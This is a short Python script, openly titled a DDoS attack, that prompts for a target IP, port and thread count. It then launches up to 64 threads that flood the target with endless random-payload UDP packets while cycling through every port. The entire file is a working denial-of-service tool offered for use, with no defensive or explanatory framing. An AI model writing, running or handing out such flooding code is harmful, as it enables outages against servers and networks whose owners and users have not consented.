import sys
import os
import threading
import time
import socket
import random
# Code Time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = os.urandom(1490)
#############
print("DDOS-attack")
ip = input("IP Target: ")
port = int(input("Port: "))
thread = int(input("Thread: "))
if thread > 64:
    print("Thread cannot be greater than 64")
    thread = int(input("Thread: "))

print("ddos-attack start after 3 second")

time.sleep(3)


def run_send(ip, port):
    print("开始攻击")
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        # print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
        if port == 65534:
            port = 1


executor = ThreadPoolExecutor(max_workers=64)
for i in range(thread):
    executor.submit(run_send, ip, port)

